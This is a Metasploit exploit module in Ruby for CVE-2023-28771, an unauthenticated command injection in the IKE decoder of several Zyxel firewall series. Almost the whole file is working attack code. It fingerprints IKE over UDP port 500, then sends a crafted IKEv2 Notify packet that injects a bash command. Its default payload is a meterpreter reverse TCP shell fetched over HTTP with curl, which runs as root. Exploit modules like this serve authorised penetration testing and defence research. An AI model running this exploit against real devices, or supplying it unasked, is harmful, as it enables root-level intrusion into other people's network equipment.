##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zyxel IKE Packet Decoder Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange
          (IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are
          as follows: ATP (Firmware version 4.60 to 5.35 inclusive), USG FLEX (Firmware version 4.60 to 5.35 inclusive),
          VPN (Firmware version 4.60 to 5.35 inclusive), and ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive). The
          affected devices are vulnerable in a default configuration and command execution is with root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sf', # MSF Exploit & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2023-28771'],
          ['URL', 'https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis'],
          ['URL', 'https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-remote-command-injection-vulnerability-of-firewalls']
        ],
        'DisclosureDate' => '2023-03-31',
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD],
        'Privileged' => true, # Code execution as 'root'
        'DefaultOptions' => {
          # We default to a meterpreter payload delivered via a fetch HTTP adapter.
          # Another good payload choice is cmd/unix/reverse_bash.
          'PAYLOAD' => 'cmd/linux/http/mips64/meterpreter_reverse_tcp',
          'FETCH_WRITABLE_DIR' => '/tmp',
          'FETCH_COMMAND' => 'CURL'
        },
        'Targets' => [ [ 'Default', {} ] ],
        'DefaultTarget' => 0,
        'Notes' => {
          # The process /sbin/sshipsecpm may crash after we terminate a session, but it will restart.
          'Stability' => [CRASH_SERVICE_RESTARTS],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(500)
      ]
    )
  end

  def check
    connect_udp

    # Check for the Internet Key Exchange (IKE) service by sending an IKEv1 header with no payload. We can
    # expect to receive an IKE reply containing a Notification payload with a PAYLOAD-MALFORMED message.

    # In a default configuration, there appears no known method to identify the platform vendor or version
    # number, so we cannot identify a CheckCode other than CheckCode::Detected or CheckCode::Unknown.
    # If a VPN is configured on the target device, we may receive a Vendor ID corresponding to Zyxel, but we
    # still would not be able to identify the version number of the target service.

    ikev2_header = Rex::Text.rand_text_alpha_upper(8) # Initiator SPI
    ikev2_header << [0, 0, 0, 0, 0, 0, 0, 0].pack('C*') # Responder SPI
    ikev2_header << [0].pack('C') # Next Payload: None - 0
    ikev2_header << [16].pack('C') # Version: 1.0 - 16 (0x10)
    ikev2_header << [2].pack('C') # Exchange Type: Identity Protection - 2
    ikev2_header << [0].pack('C') # Flags: None - 0
    ikev2_header << [0].pack('N') # ID: 0
    ikev2_header << [ikev2_header.length + 4].pack('N') # Length

    udp_sock.put(ikev2_header)

    ikev2_reply = udp_sock.get(udp_sock.def_read_timeout)

    disconnect_udp

    if !ikev2_reply.empty? && (ikev2_reply.length >= 40) &&
       # Ensure the response 'Initiator SPI' field is the same as the original one sent.
       (ikev2_reply[0, 8] == ikev2_header[0, 8]) &&
       # Ensure the 'Next Payload' field is Notification (11)
       (ikev2_reply[16, 1].unpack('C').first == 11 &&
         # Ensure the 'Exchange Type' field is Informational (5)
         (ikev2_reply[18, 1].unpack('C').first == 5)) &&
       # Ensure the 'Notify Message Type' field is PAYLOAD-MALFORMED (16)
       (ikev2_reply[38, 2].unpack('n').first == 16)
      return CheckCode::Detected('IKE detected but device vendor and service version are unknown.')
    end

    CheckCode::Unknown
  end

  def exploit
    execute_command(payload.encoded)
  end

  def execute_command(cmd)
    connect_udp

    cmd_injection = "\";bash -c \"#{cmd}\";echo -n \""

    # This value is decoded by the packet decoder using a DES-CBC algorithm. The decoded value is written to the
    # log file. As such the decoded value must not have any null terminator values as these will break our command
    # payload. Therefore we use the below known good value that will decode to a suitable string, allowing the cmd
    # injection payload to work as expected.
    haxb48 = 'HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB'

    ikev2_payload = [0].pack('C') # Next Payload: None - 0
    ikev2_payload << [0].pack('C') # Reserved: 0
    ikev2_payload << [8 + (haxb48.length + cmd_injection.length)].pack('n') # Length: 8 byte header + Notification Data
    ikev2_payload << [1].pack('C') # Protocol ID: ISAKMP - 1
    ikev2_payload << [0].pack('C') # SPI Size: None - 0
    ikev2_payload << [14].pack('n') # Type: NO_PROPOSAL_CHOSEN - 14 (0x0E)
    ikev2_payload << haxb48 + cmd_injection # Notification Data

    ikev2_header = Rex::Text.rand_text_alpha_upper(8) # Initiator SPI
    ikev2_header << [0, 0, 0, 0, 0, 0, 0, 0].pack('C*') # Responder SPI
    ikev2_header << [41].pack('C') # Next Payload: Notify - 41 (0x29)
    ikev2_header << [32].pack('C') # Version: 2.0 - 32 (0x20)
    ikev2_header << [34].pack('C') # Exchange Type: IKE_SA_INIT - 34 (0x22)
    ikev2_header << [8].pack('C') # Flags: Initiator - 8
    ikev2_header << [0].pack('N') # ID: 0
    ikev2_header << [ikev2_header.length + 4 + ikev2_payload.length].pack('N') # Length

    packet = ikev2_header << ikev2_payload

    udp_sock.put(packet)

    disconnect_udp
  end

end
